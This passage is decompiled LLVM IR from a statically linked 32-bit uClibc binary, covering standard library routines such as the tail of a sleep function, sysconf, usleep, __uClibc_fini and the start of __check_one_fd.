  store i32 %v1_805408d, i32* %edx.global-to-local, align 4
  %v1_805408e = icmp eq i1 %v9_805408d, false
  br i1 %v1_805408e, label %dec_label_pc_8054082.dec_label_pc_8054082_crit_edge, label %dec_label_pc_8054090

dec_label_pc_8054082.dec_label_pc_8054082_crit_edge: ; preds = %dec_label_pc_8054082
  %v0_8054082.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054082

dec_label_pc_8054090:                             ; preds = %dec_label_pc_8054082
  store i32 %v2_8054033, i32* %eax.global-to-local, align 4
  store i32 %v2_8054033, i32* %stack_var_-460, align 4
  %v4_805409c = call i32 @__sigaddset(i32 %v2_8054033, i32 17, i32 0, i32 0)
  store i32 %v4_805409c, i32* %eax.global-to-local, align 4
  %v2_80540a4 = icmp slt i32 %v4_805409c, 0
  br i1 %v2_80540a4, label %dec_label_pc_805416b, label %dec_label_pc_80540ac

dec_label_pc_80540ac:                             ; preds = %dec_label_pc_8054090
  %v2_80540ad = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80540ad, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80540b6 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_80540ad)
  store i32 %v4_80540b6, i32* %eax.global-to-local, align 4
  %v2_80540be = icmp slt i32 %v4_80540b6, 0
  %v1_80540c0 = icmp eq i1 %v2_80540be, false
  br i1 %v1_80540c0, label %dec_label_pc_80540ea, label %dec_label_pc_80540c2

dec_label_pc_80540c2:                             ; preds = %dec_label_pc_80540ac
  %v0_80540c2 = load i32, i32* %stack_var_-460, align 4
  %v1_80540c2 = call i32 @__errno_location(i32 %v0_80540c2)
  store i32 %v1_80540c2, i32* %eax.global-to-local, align 4
  store i32 %v1_80540c2, i32* @ebx, align 4
  %v1_80540c9 = inttoptr i32 %v1_80540c2 to i32*
  %v2_80540c9 = load i32, i32* %v1_80540c9, align 4
  store i32 %v2_80540c9, i32* @esi, align 4
  store i32 %v2_805404c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80540d8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80540d8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80540d8, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80540e3 = load i32, i32* @esi, align 4
  %v1_80540e3 = load i32, i32* @ebx, align 4
  %v2_80540e3 = inttoptr i32 %v1_80540e3 to i32*
  store i32 %v0_80540e3, i32* %v2_80540e3, align 4
  %v0_8054178.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416e

dec_label_pc_80540ea:                             ; preds = %dec_label_pc_80540ac
  %v3_80540ea = load i32, i32* %stack_var_-420, align 4
  %v12_80540ea = icmp eq i32 %v3_80540ea, 1
  %v2_80540f6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80540f6, i32* @ebx, align 4
  %v1_80540fd = icmp eq i1 %v12_80540ea, false
  br i1 %v1_80540fd, label %dec_label_pc_8054124, label %dec_label_pc_80540ff

dec_label_pc_80540ff:                             ; preds = %dec_label_pc_80540ea
  store i32 %v2_80540f6, i32* %stack_var_-460, align 4
  %v2_8054103 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054103 = call i32 @__libc_nanosleep(%timespec* %v2_8054103, i32 %v2_80540f6)
  store i32 %v3_8054103, i32* %eax.global-to-local, align 4
  store i32 %v3_8054103, i32* @edi, align 4
  %v1_805410a = call i32 @__errno_location(i32 %v2_80540f6)
  store i32 %v1_805410a, i32* %eax.global-to-local, align 4
  store i32 %v1_805410a, i32* @ebx, align 4
  %v1_8054114 = inttoptr i32 %v1_805410a to i32*
  %v2_8054114 = load i32, i32* %v1_8054114, align 4
  store i32 %v2_8054114, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805411b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805411b = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805411b, i32 0)
  store i32 %v4_805411b, i32* %eax.global-to-local, align 4
  %v0_8054120 = load i32, i32* @esi, align 4
  %v1_8054120 = load i32, i32* @ebx, align 4
  %v2_8054120 = inttoptr i32 %v1_8054120 to i32*
  store i32 %v0_8054120, i32* %v2_8054120, align 4
  %v0_805414a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054147

dec_label_pc_8054124:                             ; preds = %dec_label_pc_80540ea
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805412a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805412a = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805412a, i32 0)
  store i32 %v4_805412a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054140

dec_label_pc_8054135:                             ; preds = %dec_label_pc_8054067
  %v2_8054137 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054137, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054140

dec_label_pc_8054140:                             ; preds = %dec_label_pc_8054124, %dec_label_pc_8054135
  %storemerge3.pre-phi = phi i32 [ %v2_80540f6, %dec_label_pc_8054124 ], [ %v2_8054137, %dec_label_pc_8054135 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8054140 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054140 = call i32 @__libc_nanosleep(%timespec* %v2_8054140, i32 %storemerge3.pre-phi)
  store i32 %v3_8054140, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054147

dec_label_pc_8054147:                             ; preds = %dec_label_pc_80540ff, %dec_label_pc_8054140
  %v0_805414a = phi i32 [ %v0_805414a.pre, %dec_label_pc_80540ff ], [ %v3_8054140, %dec_label_pc_8054140 ]
  %v1_805414a = icmp eq i32 %v0_805414a, 0
  br i1 %v1_805414a, label %dec_label_pc_8054167, label %dec_label_pc_805414e

dec_label_pc_805414e:                             ; preds = %dec_label_pc_8054147
  %v4_805415e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805415e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416e

dec_label_pc_8054167:                             ; preds = %entry, %dec_label_pc_8054147
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416e

dec_label_pc_805416b:                             ; preds = %dec_label_pc_8054090, %dec_label_pc_805404b, %dec_label_pc_805401d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416e

dec_label_pc_805416e:                             ; preds = %dec_label_pc_8054167, %dec_label_pc_805414e, %dec_label_pc_80540c2, %dec_label_pc_805416b
  %v0_8054178 = phi i32 [ 0, %dec_label_pc_8054167 ], [ %v4_805415e, %dec_label_pc_805414e ], [ %v0_8054178.pre, %dec_label_pc_80540c2 ], [ -1, %dec_label_pc_805416b ]
  store i32 %v0_8053ff3, i32* @ebx, align 4
  store i32 %v0_8053ff2, i32* @esi, align 4
  store i32 %v0_8053ff1, i32* @edi, align 4
  ret i32 %v0_8054178

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805410a, { 1, 0, 2 }
  uselistorder i32 %v2_80540f6, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805408d, { 2, 1, 0 }
  uselistorder i32 %v2_805404c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8054033, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805401a, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805416e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8054167, { 1, 0 }
  uselistorder label %dec_label_pc_8054147, { 1, 0 }
  uselistorder label %dec_label_pc_8054140, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805419b [
    i32 0, label %dec_label_pc_80541ab
    i32 1, label %dec_label_pc_8054290
    i32 2, label %dec_label_pc_80541b5
    i32 3, label %dec_label_pc_80541bf
    i32 4, label %dec_label_pc_80541c9
    i32 5, label %dec_label_pc_805425f
    i32 6, label %dec_label_pc_80541d1
    i32 7, label %dec_label_pc_8054191
    i32 8, label %dec_label_pc_8054191
    i32 9, label %dec_label_pc_8054191
    i32 10, label %dec_label_pc_8054191
    i32 11, label %dec_label_pc_8054191
    i32 12, label %dec_label_pc_8054191
    i32 13, label %dec_label_pc_8054191
    i32 14, label %dec_label_pc_8054191
    i32 15, label %dec_label_pc_8054191
    i32 16, label %dec_label_pc_8054191
    i32 17, label %dec_label_pc_8054191
    i32 18, label %dec_label_pc_8054191
    i32 19, label %dec_label_pc_8054191
    i32 20, label %dec_label_pc_8054191
    i32 21, label %dec_label_pc_8054191
    i32 22, label %dec_label_pc_8054191
    i32 23, label %dec_label_pc_8054290
    i32 24, label %dec_label_pc_8054290
    i32 25, label %dec_label_pc_805429c
    i32 26, label %dec_label_pc_805426d
    i32 27, label %dec_label_pc_8054290
    i32 28, label %dec_label_pc_80541e3
    i32 29, label %dec_label_pc_8054266
    i32 30, label %dec_label_pc_80541db
    i32 31, label %dec_label_pc_805427b
    i32 32, label %dec_label_pc_8054290
    i32 33, label %dec_label_pc_8054290
    i32 34, label %dec_label_pc_8054290
    i32 35, label %dec_label_pc_8054274
    i32 36, label %dec_label_pc_80542a3
    i32 37, label %dec_label_pc_80542aa
    i32 38, label %dec_label_pc_80542a3
    i32 39, label %dec_label_pc_80541ed
    i32 40, label %dec_label_pc_80542b1
    i32 41, label %dec_label_pc_8054290
    i32 42, label %dec_label_pc_805427b
    i32 43, label %dec_label_pc_80542aa
    i32 44, label %dec_label_pc_80542b8
    i32 45, label %dec_label_pc_80542aa
    i32 46, label %dec_label_pc_8054266
    i32 47, label %dec_label_pc_8054266
    i32 48, label %dec_label_pc_8054266
    i32 49, label %dec_label_pc_8054290
    i32 50, label %dec_label_pc_8054290
    i32 51, label %dec_label_pc_8054266
    i32 52, label %dec_label_pc_8054266
    i32 53, label %dec_label_pc_8054290
    i32 54, label %dec_label_pc_8054290
    i32 55, label %dec_label_pc_8054290
    i32 56, label %dec_label_pc_8054290
    i32 57, label %dec_label_pc_8054290
    i32 58, label %dec_label_pc_8054290
    i32 59, label %dec_label_pc_8054290
    i32 60, label %dec_label_pc_8054290
    i32 61, label %dec_label_pc_8054290
    i32 62, label %dec_label_pc_8054290
    i32 63, label %dec_label_pc_8054290
    i32 64, label %dec_label_pc_8054290
    i32 65, label %dec_label_pc_8054290
    i32 66, label %dec_label_pc_8054290
    i32 67, label %dec_label_pc_8054191
    i32 68, label %dec_label_pc_8054191
    i32 69, label %dec_label_pc_8054274
    i32 70, label %dec_label_pc_8054274
    i32 71, label %dec_label_pc_8054274
    i32 72, label %dec_label_pc_805427b
    i32 73, label %dec_label_pc_8054282
    i32 74, label %dec_label_pc_8054289
    i32 75, label %dec_label_pc_80541f7
    i32 76, label %dec_label_pc_8054289
    i32 77, label %dec_label_pc_8054191
    i32 78, label %dec_label_pc_8054191
    i32 79, label %dec_label_pc_8054191
    i32 80, label %dec_label_pc_8054191
    i32 81, label %dec_label_pc_8054191
    i32 82, label %dec_label_pc_8054191
    i32 83, label %dec_label_pc_8054191
    i32 84, label %dec_label_pc_8054191
    i32 85, label %dec_label_pc_8054290
    i32 86, label %dec_label_pc_8054290
    i32 87, label %dec_label_pc_805426d
    i32 88, label %dec_label_pc_8054201
    i32 89, label %dec_label_pc_805420b
    i32 90, label %dec_label_pc_8054282
    i32 91, label %dec_label_pc_8054191
    i32 92, label %dec_label_pc_8054191
    i32 93, label %dec_label_pc_8054191
    i32 94, label %dec_label_pc_8054191
    i32 95, label %dec_label_pc_8054266
    i32 96, label %dec_label_pc_8054290
    i32 97, label %dec_label_pc_8054290
    i32 98, label %dec_label_pc_8054191
    i32 99, label %dec_label_pc_8054191
    i32 100, label %dec_label_pc_8054191
    i32 101, label %dec_label_pc_8054215
    i32 102, label %dec_label_pc_8054258
    i32 103, label %dec_label_pc_8054295
    i32 104, label %dec_label_pc_805426d
    i32 105, label %dec_label_pc_805421f
    i32 106, label %dec_label_pc_805427b
    i32 107, label %dec_label_pc_805427b
    i32 108, label %dec_label_pc_805425f
    i32 109, label %dec_label_pc_805429c
    i32 110, label %dec_label_pc_80542b8
    i32 111, label %dec_label_pc_8054258
    i32 112, label %dec_label_pc_8054295
    i32 113, label %dec_label_pc_80542b8
    i32 114, label %dec_label_pc_8054229
    i32 115, label %dec_label_pc_80542b1
    i32 116, label %dec_label_pc_8054290
    i32 117, label %dec_label_pc_8054290
    i32 118, label %dec_label_pc_8054233
    i32 119, label %dec_label_pc_805423d
    i32 120, label %dec_label_pc_80542aa
    i32 121, label %dec_label_pc_805426d
    i32 122, label %dec_label_pc_805426d
    i32 123, label %dec_label_pc_805426d
    i32 124, label %dec_label_pc_805426d
    i32 125, label %dec_label_pc_8054191
    i32 126, label %dec_label_pc_8054191
    i32 127, label %dec_label_pc_8054290
    i32 128, label %dec_label_pc_8054290
    i32 129, label %dec_label_pc_8054191
    i32 130, label %dec_label_pc_8054191
    i32 131, label %dec_label_pc_8054290
    i32 149, label %dec_label_pc_8054244
  ]

dec_label_pc_8054191:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805419b:                             ; preds = %entry
  %v1_805419b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80541a0 = inttoptr i32 %v1_805419b to i32*
  store i32 22, i32* %v1_80541a0, align 4
  br label %dec_label_pc_8054290

dec_label_pc_80541ab:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80541b5:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80541bf:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80541c9:                             ; preds = %entry
  %v0_80541cc = call i32 @getdtablesize()
  br label %dec_label_pc_80541d1

dec_label_pc_80541d1:                             ; preds = %entry, %dec_label_pc_80541c9
  br label %dec_label_pc_80542bd

dec_label_pc_80541db:                             ; preds = %entry
  %v3_80541de = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80541e3

dec_label_pc_80541e3:                             ; preds = %entry, %dec_label_pc_80541db
  br label %dec_label_pc_80542bd

dec_label_pc_80541ed:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80541f7:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054201:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805420b:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054215:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805421f:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054229:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054233:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805423d:                             ; preds = %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054244:                             ; preds = %entry
  %v5_805424a = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8054252 = icmp slt i32 %v5_805424a, 0
  %v1_8054254 = icmp eq i1 %v2_8054252, false
  br i1 %v1_8054254, label %dec_label_pc_8054266, label %dec_label_pc_8054290

dec_label_pc_8054258:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805425f:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054266:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054244
  br label %dec_label_pc_80542bd

dec_label_pc_805426d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054274:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805427b:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054282:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054289:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_8054290:                             ; preds = %dec_label_pc_8054244, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805419b
  br label %dec_label_pc_80542bd

dec_label_pc_8054295:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_805429c:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80542a3:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80542aa:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80542b1:                             ; preds = %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80542b8:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80542bd

dec_label_pc_80542bd:                             ; preds = %dec_label_pc_80542b1, %dec_label_pc_80542aa, %dec_label_pc_80542a3, %dec_label_pc_805429c, %dec_label_pc_8054295, %dec_label_pc_8054289, %dec_label_pc_8054282, %dec_label_pc_805427b, %dec_label_pc_8054274, %dec_label_pc_805426d, %dec_label_pc_805425f, %dec_label_pc_8054258, %dec_label_pc_8054266, %dec_label_pc_805423d, %dec_label_pc_8054233, %dec_label_pc_8054229, %dec_label_pc_805421f, %dec_label_pc_8054215, %dec_label_pc_805420b, %dec_label_pc_8054201, %dec_label_pc_80541f7, %dec_label_pc_80541ed, %dec_label_pc_80541e3, %dec_label_pc_80541d1, %dec_label_pc_80541bf, %dec_label_pc_80541b5, %dec_label_pc_80541ab, %dec_label_pc_8054191, %dec_label_pc_8054290, %dec_label_pc_80542b8
  %v0_80542c0 = phi i32 [ 255, %dec_label_pc_80542b1 ], [ 2048, %dec_label_pc_80542aa ], [ 99, %dec_label_pc_80542a3 ], [ 20, %dec_label_pc_805429c ], [ -128, %dec_label_pc_8054295 ], [ 1024, %dec_label_pc_8054289 ], [ 4, %dec_label_pc_8054282 ], [ 32, %dec_label_pc_805427b ], [ 256, %dec_label_pc_8054274 ], [ 2147483647, %dec_label_pc_805426d ], [ 16, %dec_label_pc_805425f ], [ 127, %dec_label_pc_8054258 ], [ 200112, %dec_label_pc_8054266 ], [ 9, %dec_label_pc_805423d ], [ 65535, %dec_label_pc_8054233 ], [ -32768, %dec_label_pc_8054229 ], [ -2147483648, %dec_label_pc_805421f ], [ 8, %dec_label_pc_8054215 ], [ 500, %dec_label_pc_805420b ], [ 4096, %dec_label_pc_8054201 ], [ 16384, %dec_label_pc_80541f7 ], [ 1000, %dec_label_pc_80541ed ], [ 32768, %dec_label_pc_80541e3 ], [ 6, %dec_label_pc_80541d1 ], [ 65536, %dec_label_pc_80541bf ], [ 100, %dec_label_pc_80541b5 ], [ 131072, %dec_label_pc_80541ab ], [ 1, %dec_label_pc_8054191 ], [ -1, %dec_label_pc_8054290 ], [ 32767, %dec_label_pc_80542b8 ]
  ret i32 %v0_80542c0

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 129, { 2, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 2, 1, 0, 3, 4 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 2, 1, 0 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 6, 2, 7, 1, 3, 0, 4, 5 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 1, 0 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 2, 3, 1, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80542bd, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8054290, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8054266, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80541e3, { 1, 0 }
  uselistorder label %dec_label_pc_80541d1, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80542d4 = and i64 %arg1, 4294967295
  %v8_80542d4 = udiv i64 %v2_80542d4, 1000000
  %v9_80542d4 = trunc i64 %v8_80542d4 to i32
  store i32 %v9_80542d4, i32* %stack_var_-8, align 4
  %v2_80542eb = bitcast i32* %stack_var_-8 to %timespec*
  %v3_80542eb = call i32 @__libc_nanosleep(%timespec* %v2_80542eb, i32 0)
  ret i32 %v3_80542eb

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80542f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80542f4, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_8054308, label %dec_label_pc_8054315

dec_label_pc_8054308:                             ; preds = %entry, %dec_label_pc_8054308
  %v1_805430f6 = phi i32 [ %v1_805430f, %dec_label_pc_8054308 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_805430f.531 to i32), i32* %stack_var_-16, align 4
  %v5_8054308 = mul i32 %v1_805430f6, 4
  %v6_8054308 = add i32 %v5_8054308, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_8054308 = inttoptr i32 %v6_8054308 to i32*
  %v8_8054308 = load i32, i32* %v7_8054308, align 4
  call void @__pseudo_call(i32 %v8_8054308)
  %v0_805430f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805430f = add i32 %v0_805430f.pre, -1
  store i32 %v1_805430f, i32* %ebx.global-to-local, align 4
  %v10_8054310 = icmp eq i32 %v0_805430f.pre, 0
  %v1_8054313 = icmp eq i1 %v10_8054310, false
  br i1 %v1_8054313, label %dec_label_pc_8054308, label %dec_label_pc_8054315

dec_label_pc_8054315:                             ; preds = %dec_label_pc_8054308, %entry
  %v0_8054315 = load i32, i32* @global_var_8061794.532, align 4
  %v1_805431a = icmp eq i32 %v0_8054315, 0
  br i1 %v1_805431a, label %dec_label_pc_8054320, label %dec_label_pc_805431e

dec_label_pc_805431e:                             ; preds = %dec_label_pc_8054315
  %v0_805431e = load i32, i32* %stack_var_-16, align 4
  %v1_805431e = call i32 @unknown_0(i32 %v0_805431e)
  br label %dec_label_pc_8054320

dec_label_pc_8054320:                             ; preds = %dec_label_pc_805431e, %dec_label_pc_8054315
  %v0_8054320 = load i32, i32* @global_var_8061798.533, align 8
  %v1_8054326 = icmp eq i32 %v0_8054320, 0
  br i1 %v1_8054326, label %dec_label_pc_805432f, label %dec_label_pc_805432a

dec_label_pc_805432a:                             ; preds = %dec_label_pc_8054320
  %v2_805432c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805432c, i32* %ebx.global-to-local, align 4
  %v0_805432d = load i32, i32* %stack_var_-16, align 4
  %v1_805432d = call i32 @unknown_0(i32 %v0_805432d)
  br label %dec_label_pc_805432f

dec_label_pc_805432f:                             ; preds = %dec_label_pc_8054320, %dec_label_pc_805432a
  %v2_805432f = load i32, i32* %stack_var_-16, align 4
  %v2_8054330 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054330, i32* @edx, align 4
  ret i32 %v2_805432f

; uselistorder directives
  uselistorder i32 %v1_805430f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805432f, { 1, 0 }
  uselistorder label %dec_label_pc_8054308, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8054336 = load i32, i32* @eax, align 4
  ret i32 %v0_8054336
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054337 = load i32, i32* @esi, align 4
  %v0_8054338 = load i32, i32* @ebx, align 4
  store i32 %v0_8054338, i32* %stack_var_-8, align 4
  %v0_805433c = load i32, i32* @eax, align 4
